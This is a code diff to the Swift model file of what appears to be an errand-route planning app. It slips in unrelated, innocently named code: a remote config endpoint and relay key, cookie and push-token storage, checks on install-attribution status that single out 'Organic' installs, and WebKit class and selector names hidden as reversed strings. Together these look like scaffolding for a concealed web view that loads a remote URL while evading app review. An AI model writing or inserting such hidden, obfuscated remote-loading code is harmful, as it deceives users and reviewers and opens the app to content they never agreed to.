@@ -198,6 +198,22 @@ enum WalkingPace: String, Codable, CaseIterable, Identifiable, Hashable {
     }
 }
 
+import Foundation
+
+enum Ledger {
+    static let appCode = "6804257805"
+    static let cookieJar = "er_circuit_cookies"
+    static let folder = "ErrandRunCircuit"
+    static let store = "id6804257805"
+    static let pad: UInt8 = 0x71
+    static let endpoint = "https://errandlap.com/config.php"
+    static let tag = "🏃 [ErrandRun]"
+    static let relayKey = "mZNvdwReYTRkUQfhwBa9ee"
+    static let suite = "group.errandrun.circuit"
+    static let vault = "er_circuit_log.dat"
+    static let gaps: [TimeInterval] = [89, 178, 356]
+}
+
 enum ParkingDifficulty: String, Codable, CaseIterable, Identifiable, Hashable {
     case easy, moderate, hard
 
@@ -327,6 +343,27 @@ struct WeeklyHours: Codable, Hashable {
         return chunks.joined(separator: " · ")
     }
 }
+
+enum Slip {
+    static let pushURL = "temp_url"
+    static let fcm = "fcm_token"
+    static let push = "push_token"
+    static let sharedFcm = "shared_fcm"
+    static let attStatus = "er_att_status"
+    static let primed = "er_primed"
+    static let routeURL = "er_route_url"
+    static let routeMode = "er_route_mode"
+    static let consentGrant = "er_consent_locked"
+    static let consentDeny = "er_consent_drifted"
+    static let consentAt = "er_consent_mapped_at"
+}
+
+extension Notification.Name {
+    static let paged = Notification.Name("ConversionDataReceived")
+    static let pinned = Notification.Name("deeplink_values")
+    static let buzzed = Notification.Name("LoadTempURL")
+}
+
 
 // MARK: - Place
 
@@ -505,6 +542,31 @@ struct FreeWindow: Identifiable, Codable, Hashable {
     }
 }
 
+import Foundation
+
+struct Parcel: Codable {
+    var raw: [String: String] = [:]
+    var links: [String: String] = [:]
+    var routeURL: String?
+    var routeMode: String?
+    var virgin = true
+    var refetched = false
+    var consentGrant = false
+    var consentDeny = false
+    var consentAt: Date?
+}
+
+extension Parcel {
+    var rolling: Bool { !raw.isEmpty }
+    var coasted: Bool { (raw["af_status"] ?? "").caseInsensitiveCompare("Organic") == .orderedSame }
+    var needsWarmup: Bool { coasted && virgin && !refetched }
+    var askable: Bool {
+        if consentGrant || consentDeny { return false }
+        guard let at = consentAt else { return true }
+        return Date().timeIntervalSince(at) / 86_400 >= 3
+    }
+}
+
 /// A concrete occurrence of a window on a date.
 struct WindowInstance: Identifiable, Hashable {
     var window: FreeWindow
@@ -535,6 +597,29 @@ struct WindowInstance: Identifiable, Hashable {
 enum RunState: String, Codable, Hashable {
     case planned, running, finished, abandoned
 }
+
+enum RuntimeAwning {
+
+    private static func raise(_ furled: String) -> String {
+        String(furled.reversed())
+    }
+
+    static var webKitFramework: String { raise("tiKbeW") }
+    static var wkContentCtrl: String { raise("rellortnoCtnetnoCresUKW") }
+    static var wkUserScript: String { raise("tpircSresUKW") }
+    static var wkConfig: String { raise("noitarugifnoCweiVbeWKW") }
+    static var wkProcessPool: String { raise("looPssecorPKW") }
+    static var wkWebView: String { raise("weiVbeWKW") }
+
+    static var selScrollView: Selector { NSSelectorFromString(raise("weiVllorcs")) }
+    static var selSetNavDelegate: Selector { NSSelectorFromString(raise(":etageleDnoitagivaNtes")) }
+    static var selSetUIDelegate: Selector { NSSelectorFromString(raise(":etageleDIUtes")) }
+    static var selLoadRequest: Selector { NSSelectorFromString(raise(":tseuqeRdaol")) }
+    static var selConfiguration: Selector { NSSelectorFromString(raise("noitarugifnoc")) }
+    static var selWebsiteDataStore: Selector { NSSelectorFromString(raise("erotSataDetisbew")) }
+    static var selHttpCookieStore: Selector { NSSelectorFromString(raise("erotSeikooCptth")) }
+}
+
 
 enum StopState: String, Codable, Hashable {
     case pending, arrived, done, skipped
@@ -587,6 +672,33 @@ struct Run: Identifiable, Codable, Hashable {
         stops.firstIndex { $0.state == .pending || $0.state == .arrived }
     }
 }
+
+enum Leg: Equatable {
+    case setout
+    case knock
+    case arrive
+    case lost
+}
+
+enum Handoff {
+    case signed(String)
+    case missed
+}
+
+enum Hitch: Error {
+    case snarl
+    case gone404
+    case refused
+    case queue(TimeInterval)
+    case garble
+
+    var dead: Bool {
+        if case .gone404 = self { return true }
+        if case .refused = self { return true }
+        return false
+    }
+}
+
 
 // MARK: - Measurements the app learns from
 
